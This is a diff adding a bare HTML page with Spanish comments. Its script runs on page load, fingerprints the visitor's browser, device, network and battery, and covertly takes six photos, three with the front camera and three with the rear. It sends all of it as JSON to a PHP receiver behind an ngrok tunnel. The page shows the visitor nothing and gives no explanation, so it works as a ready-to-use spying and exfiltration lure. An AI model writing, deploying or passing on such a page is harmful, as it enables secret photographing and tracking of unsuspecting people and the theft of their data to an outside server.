@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Captura de Datos Completa</title>
+</head>
+<body>
+    <script>                                                                                                 // Función para obtener la información del dispositivo y batería
+        function collectDeviceInfo() {
+            const deviceInfo = {
+                navegador: navigator.userAgent,
+                plataforma: navigator.platform,
+                idiomas: navigator.languages,
+                cookiesHabilitadas: navigator.cookieEnabled,
+                resolucionPantalla: `${screen.width}x${screen.height}`,
+                profundidadColor: screen.colorDepth,
+                orientacionPantalla: screen.orientation ? screen.orientation.type : "No disponible",
+                enLinea: navigator.onLine,
+                conexion: navigator.connection ? {
+                    tipo: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt,
+                    ahorroDatos: navigator.connection.saveData
+                } : "No disponible",
+                zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                fechaLocal: new Date().toLocaleString(),
+                appCodeName: navigator.appCodeName,
+                appName: navigator.appName,
+                appVersion: navigator.appVersion,
+                producto: navigator.product,
+                vendor: navigator.vendor,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                maxTouchPoints: navigator.maxTouchPoints,
+                fotos: [] // Se llenará con las fotos tomadas
+            };
+
+            // Obtén el nivel de batería si está disponible
+            if (navigator.getBattery) {
+                navigator.getBattery().then(function(battery) {
+                    deviceInfo.bateria = Math.round(battery.level * 100) + "%";
+                    requestCameraPermission(deviceInfo, true); // Comenzar con la cámara frontal
+                });
+            } else {
+                requestCameraPermission(deviceInfo, true); // Comenzar con la cámara frontal
+            }
+        }
+
+        // Función para pedir permiso de cámara y tomar las fotos
+        function requestCameraPermission(deviceInfo, frontal, count = 0) {
+            const constraints = { video: { facingMode: frontal ? "user" : "environment" } };
+
+            navigator.mediaDevices.getUserMedia(constraints)
+                .then(function(stream) {
+                    const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
+                    return imageCapture.takePhoto();
+                })
+                .then(function(photoBlob) {
+                    const reader = new FileReader();
+                    reader.onload = function(event) {
+                        deviceInfo.fotos.push(event.target.result); // Guarda la foto como base64
+                        count++;
+
+                        // Si hemos capturado menos de 3 fotos, seguir capturando
+                        if (count < 3) {
+                            requestCameraPermission(deviceInfo, frontal, count);
+                        } else {
+                            // Si hemos capturado 3 fotos con la cámara frontal, cambiar a la cámara trasera
+                            if (frontal) {
+                                requestCameraPermission(deviceInfo, false); // Cambiar a la cámara trasera
+                            } else {
+                                sendData(deviceInfo); // Envía los datos al servidor después de capturar todas las fotos
+                            }
+                        }
+                    };
+                    reader.readAsDataURL(photoBlob);
+                })
+                .catch(function(error) {
+                    console.error('Error de cámara:', error);
+                    sendData(deviceInfo); // Envía los datos sin fotos si ocurre un error
+                });
+        }
+
+        // Función para enviar datos al servidor PHP
+        function sendData(data) {
+            const xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://4162-2607-fb90-5d60-8279-a42d-4627-bd2b-b059.ngrok-free.app/receptor.php", true);
+            xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+            xhr.send(JSON.stringify(data));
+        }
+
+        // Llamar a la función de recopilación de datos al cargar la página
+        collectDeviceInfo();
+    </script>
+</body>
+</html>
